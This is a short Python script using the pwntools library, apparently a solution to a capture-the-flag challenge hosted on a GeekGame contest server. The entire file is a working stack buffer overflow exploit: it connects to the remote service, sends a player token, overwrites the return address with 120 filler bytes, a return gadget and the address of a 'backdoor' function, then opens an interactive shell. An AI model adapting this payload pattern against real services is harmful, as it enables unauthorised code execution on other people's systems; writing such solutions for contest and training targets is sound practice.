from pwn import *

ip = "prob10.geekgame.pku.edu.cn"
token = b"9:How do you know my uid is 9"
port = 10010

r = remote(ip, port)
r.sendline(token)

backdoor_addr = 0x4011b6
ret_addr = 0x40136c

payload = b'0\n' + b"A" * 120 + p64(ret_addr) + p64(backdoor_addr)

print(r.recv())
r.sendline(payload)

r.interactive()